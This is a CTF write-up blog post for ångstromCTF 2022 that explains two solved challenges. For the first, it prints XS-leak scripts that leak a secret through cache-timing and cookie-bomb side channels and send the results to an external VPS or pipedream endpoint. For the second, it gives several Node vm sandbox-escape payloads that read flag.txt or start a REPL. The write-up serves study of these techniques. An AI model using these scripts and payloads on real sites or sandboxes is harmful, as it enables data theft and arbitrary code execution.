---
title: ångstromCTF 2022 Writeup
date: 2022-05-05 17:43:37
tags: [Security]
categories: [Security]
translator: huli
photos: /img/angstrom-ctf-2022-writeup-en/cover-en.png
---
<img src="/img/angstrom-ctf-2022-writeup-en/cover-en.png" style="display:none">

I didn't check all the challenges this time because when I joined the competition, most of the challenges already solved by my teammates lol

I love JavaScript(yep, including those weird features) and XS-leak, so this writeup will talk about only two challenges:

1. web/Sustenance
2. misc/CaaSio PSE

<!-- more -->

## web/Sustenance

It's a very simple app:

``` js
const express = require("express");
const cookieParser = require("cookie-parser");
const path = require("path");

const app = express();
app.use(express.urlencoded({ extended: false }));

// environment config
const port = Number(process.env.PORT) || 8080;
const adminSecret = process.env.ADMIN_SECRET || "secretpw";
const flag =
    process.env.FLAG ||
    "actf{someone_is_going_to_submit_this_out_of_desperation}";

function queryMiddleware(req, res, next) {
    res.locals.search =
        req.cookies.search || "the quick brown fox jumps over the lazy dog";
    // admin is a cool kid
    if (req.cookies.admin === adminSecret) {
        res.locals.search = flag;
    }
    next();
}

app.use(cookieParser());

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/s", (req, res) => {
    if (req.body.search) {
        for (const [name, val] of Object.entries(req.body)) {
            res.cookie(name, val, { httpOnly: true });
        }
    }
    res.redirect("/");
});

app.get("/q", queryMiddleware, (req, res) => {
    const query = req.query.q || "h"; // h
    let status;
    if (res.locals.search.includes(query)) {
        status =
            "succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance";
    } else {
        status = "failed";
    }
    res.redirect(
        "/?m=" +
            encodeURIComponent(
                `your search that took place at ${Date.now()} has ${status}`
            )
    );
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
```

There are two features:

1. You can set any cookie
2. You can search whether certain characters exist in the flag

There is no way to perform XSS, so it's obviously a challenge about XS-leak.

Since it's XS-leak, we must observe what is the difference between "found" and "not found".

The search query is like this: `/q?q=actf`, if it's found, it will redirect to`/?m=your search...at 1651732982748 has success....` and not found will redirect to`/?m=your search...ar 1651732982748 has failed`

There are two differences between success and failure:

1. URL is different
2. The content of the page is different

At the beginning, the direction I tried was cache probing, because the visited pages will be stored in the disk cache, so as long as you use the method of `fetch with force-cache`, you can judge whether it is in the cache according to the time difference. As for the timestamp on the URL, just set a range such as 1~1000 to brute force.

Because of the default SameSite=Lax, you can only use `window.open` for top-level navigation when searching, otherwise the cookie will not be sent.

The biggest problem is that Chrome now has cache partitioning, and the cache key of the newly opened page is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, but if I open an ngrok page and use fetch in it, the cache key will be: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf .co/?m=xxx)`, the cache key is different, so the cache cannot be shared. You can find more detail here: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)

I also discussed with my teammates whether we can use the cookie bomb to do something since we can set cookies, but we didn't find any way to exploit after the discussion.

Then I tried to use the method in the [pbctf 2021 Vault](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html), use `a:visited` to leak the history, but I found that it's not work in headless Chrome. It works in my local Chrome, but not in headless mode, the time to render the visited link is always fast(like 16ms).

After a while, [lebr0nli](https://lebr0nli.github.io/blog/) posted a POC on the channel about cache probing, which is modified from [Maple's writeup](https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#vault). The point is "we can use other same site domain to bypass cache partitioning".

For example, the URL for the other challenge is `https://xtra-salty-sardines.web.actf.co/`, if you use fetch from that domain, the cache key will also be `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)` because cache key only take eTLD+1 into account. So same site, same cache key.

The problem he encountered is that it works on local, but on remote it's always false positive. So I made another one based on  his POC, tried to send back some more data, and found that the problem was that the server was running pretty fast.

For example, if there is a cache, it takes 3ms, and if there is no cache, it only takes 5ms. The difference is very small. Even the timestamp part is also within 10ms after `window.open`.

Therefore, I modified the exploit script and calculated the average time of cache at the remote end, and successfully leaked the flag. The script is as follows:

https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722

``` js
// to hang the connection
fetch('https://deelay.me/20000/https://example.com')

// NOTE: we will calculate this baseline before doing the attack
var baseLine = 3.2
const sleep = ms => new Promise((resolve) => setTimeout(resolve, ms))

go()
async function go() {
  await calculateBaseline()
  main()

  async function calculateBaseline() {
    var m = Math.random()
    let win = window.open('https://sustenance.web.actf.co/?m=cached_' + m)
    
    // NOTE: this number can be decreased by detecting window load
    await sleep(500)
    win.close()
    let total = 0
    for(let i=1; i<=5; i++) {
      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=cached_' + m)
      total += ts
      report(`Cached time, round: ${i}, ${ts}ms`)
    }
    // NOTE: 0.5 is just a random guess
    baseLine = (total/5) + 0.5
    report(`Baseline: ${baseLine}`)
    
    // NOTE: adjust baseline, should not be more than 3 ms based on previous testing
    if (baseLine > 3) {
      baseLine = 3
    }
    for(let i=1; i<=3; i++) {
      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=not_cached_' + m)
      report(`Not Cached time, round: ${i}, ${ts}ms`)
    }
  }

  // NOTE: server is quite fast so no need to set timeout
  async function getLoadTime(url) {
    const start = performance.now()
    await fetch(url, { cache: 'force-cache', mode: 'no-cors' })
    return performance.now() - start
  }

  function genSucceedUrl(t) {
    let ft = t + ''
    while(ft.length < 13) {
      ft += '0'
    }
    const status = "succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance";
    return 'https://sustenance.web.actf.co/?m=' + encodeURIComponent(`your search that took place at ${ft} has ${status}`);
  }

  async function isCached(str) {
    let start = +new Date()
    let win = window.open(`https://sustenance.web.actf.co/q?q=` + encodeURIComponent(str))
    await sleep(500)
    win.close()
    
    // NOTE: base on the data collected, i should be 1~20, pretty small number
    for(let i=1; i<=30; i++) {
      const url = genSucceedUrl(start + i)
      let loadTime = await getLoadTime(url)
      if (loadTime <= baseLine) {
        
        // NOTE: check again to see if it really meets the condition
        let total = 0
        for(let j=1; j<=3; j++) {
          total += await getLoadTime(url)
        }
        total/=3
        if (total <= baseLine) {
          report(`isCached success, str=${str}, i=${i}, start=${start}, total=${total}`)
          return true
        }
      }
    }
    return false
  }

  async function main() {
    let flag = 'actf{yummy_'
    
    // NOTE: we can leak the charset first to speed up the process
    let chars = 'acefsmntuy_}'.split('')
    while(flag[flag.length - 1] !== '}') {
      for(let char of chars) {
        report('trying:'  + flag + char)
        if (await isCached(flag + char)) {
          flag += char
          report('flag:' + flag)
          break
        }
      }
    }
  }

  async function report(data) {
    console.log(data)
    // TODO: change to your VPS
    return fetch('https://YOUR_VPS/', { method: 'POST', body: data, mode: 'no-cors' }).catch(err => err);
  }
}
```

We can leak the charset first, and the speed will be much faster. There are still some parts that can be improved, and the speed should be faster.

Later, teammates posted another writeup: [UIUCTF 2021- yana](https://ctf.zeyu2001.com/2021/uiuctf-2021/yana#this-shouldnt-have-worked), it seems that headless chrome has no cache partitioning at the moment.

I tested it myself and found that it is still the same now, so actually we don't need other same site domain. It still works if you put this exploit on your own website.

### Intended

The intended solution should be the cookie bomb I mentioned above. First, set a lot of cookies, and then use the feature that the URL of success and failure are different.

If successful, the URL will be longer, the request will be too large to handle by the server so return an error http status code. If the search fails, nothing will happen because URL is short.

The script below is from Strellic, you need to run it on another same site domain:

``` html
<>'";<form action='https://sustenance.web.actf.co/s' method=POST><input id=f /><input name=search value=a /></form>
<script>
    const $ = document.querySelector.bind(document);
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    let i = 0;
    const stuff = async (len=3500) => {
        let name = Math.random();
        $("form").target = name;
        let w = window.open('', name);
        $("#f").value = "_".repeat(len);
        $("#f").name = i++;
        $("form").submit();
        await sleep(100);
    };
    const isError = async (url) => {
        return new Promise(r => {
            let script = document.createElement('script');
            script.src = url;
            script.onload = () => r(false);
            script.onerror = () => r(true);
            document.head.appendChild(script);
        });
    }
    const search = (query) => {
        return isError("https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query));
    };
    const alphabet = "etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ";
    const url = "//en4u1nbmyeahu.x.pipedream.net/";
    let known = "actf{";
    window.onload = async () => {
        navigator.sendBeacon(url + "?load");
        await Promise.all([stuff(), stuff(), stuff(), stuff()]);
        await stuff(1600);
        navigator.sendBeacon(url + "?go");
        while (true) {
            for (let c of alphabet) {
                let query = known + c;
                if (await search(query)) {
                    navigator.sendBeacon(url, query);
                    known += c;
                    break;
                }
            }
        }
    };
</script>
```

Here are a few details to note:

1. If the request is too large, the server will return an error(status 413 or 431 I think)
2. Because it is the same site, `<script>` will automatically carry a cookie when sending a request
3. You can use the onload/onerror event of script to detect whether the http status code is successful or not

## misc/CaaSio PSE

It's a jsjail with strong restrictions:

``` js
#!/usr/local/bin/node

// flag in ./flag.txt

const vm = require("vm");
const readline = require("readline");

const interface = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

interface.question(
    "Welcome to CaaSio: Please Stop Edition! Enter your calculation:\n",
    function (input) {
        interface.close();
        if (
            input.length < 215 &&
            /^[\x20-\x7e]+$/.test(input) &&
            !/[.\[\]{}\s;`'"\\_<>?:]/.test(input) &&
            !input.toLowerCase().includes("import")
        ) {
            try {
                const val = vm.runInNewContext(input, {});
                console.log("Result:");
                console.log(val);
                console.log(
                    "See, isn't the calculator so much nicer when you're not trying to hack it?"
                );
            } catch (e) {
                console.log("your tried");
            }
        } else {
            console.log(
                "Third time really is the charm! I've finally created an unhackable system!"
            );
        }
    }
);
```

It's east to bypass VM, we can use `this.constructor.constructor('return ...')()` . But the difficult part is about the limited charset, we can't use all string related symbol, also `.[]();>` is not allowed.

After trying for a while, I recalled that we can use [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) to access property, like this:

``` js
with(console)log(123)
```

For string, we can use regexp to bypass, like this:`/string/.source`.

I also thought about `decodeURI` but haven't try it, there are a lot of people solve it this way, like lebr0nli:

``` js
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
```

If regexp is converted into a string, there will be one `/` at the start and the other at the end. We can solve this issue by adding `/\n` to the regexp, it will be combined with the previous one like this:

``` js
//
your_code_here
```

The idea is similar to the [XSS challenge](https://blog.huli.tw/2022/02/14/en/intigriti-0222-author-writeup/) I made.

Anyway, here is the basic structure for my payload:

``` js
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
```

Just replace `console.log(1)` to the real code, the code we want to run is:

``` js
return String(process.mainModule.require('fs').readFileSync('flag.txt'))
```

`String()` is not required, just for better readability for the flag.

Then, we can use `with` to rewrite the code:

``` js
with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
```

Since single quote is not allowed, we can make it a variable first, then think about how to remove it.

``` js
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
```

Now, the last part is to generate a string. We can do it via `String.fromCharCode`:

``` js
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)with(require(k))return(String(readFileSync(n)))
```

The final exploit just combined the code above with the structure, I formatted the code a bit for better readability:

``` js
with(
  /with(String)
    with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
      with(mainModule)
        with(require(k))
          return(String(readFileSync(n)))
  /)
with(this)
  with(constructor)
    constructor(source)()
```

### Other solutions

I learned a lot from [Maple](https://blog.maple3142.net/2022/05/03/angstromctf-2022-writeups/)'s writeup, for example, we can use `with(a=source,/b/)` to deal with the shadowing problem.

``` js
with(/a/)with(/b/)console.log(source)
```

You can only get `/b/.source`, not `/a/.source` because it's shadowed. We can solve this by assigning the value to a variable before next `with`:

``` js
with(/a/)with(a=source,/b/)console.log(a,source)
```

Apart from these, he also uses `require('repl').start()` to start the repl mode, it's a very smart move because you can run any code without the length limit.

Below is Maple's payload:

``` js
with(/with(process)with(mainModule)with(require(x))start()/)
  with(s1=source,/x/)
  with(s2=source,/repl/)
  with(s3=source,this)
    with(constructor)
      constructor(s2,s1)(s3)
```

Here is the payload from the author, the intended is without regexp:

``` js
with(String)
  with(f=fromCharCode,this)
    with(constructor)
      with(constructor(f(r=114,101,t=116,117,r,110,32,112,r,111,99,101,s=115,s))())
        with(mainModule)
          with(require(f(102,s)))
            readFileSync(f(102,108,97,103,46,t,120,t))
```

This solution is smart because of the variable part. It uses variable to save the space.

We can combined this with Maple's solution:

``` js
with(String)
  with(f=fromCharCode,this)
    with(constructor)
      with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,99,e,s=115,s))())
        with(mainModule)
          with(require(f(r,e,p,108)))
            start()
```

It can be shorter if we replace the first `constructor` to something else, we can search for the function in `Object.prototype`

``` js
for(let key of Object.getOwnPropertyNames((obj={}).__proto__)) {
  if (typeof obj[key] === 'function') {
    console.log(key)
  }
}
```

The shortest is `valueOf`:

``` js
with(String)with(f=fromCharCode,this)with(valueOf)with(constructor(f(r=114,e=101,116,117,r,110,32,p=112,r,111,99,e,s=115,s))())with(mainModule)with(require(f(r,e,p,108)))start()
```

It's 177 in length.

For another kind of solution using `unescape`, I modified the payload from @fredd and got 115 in length in the end. 

``` js
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))
```
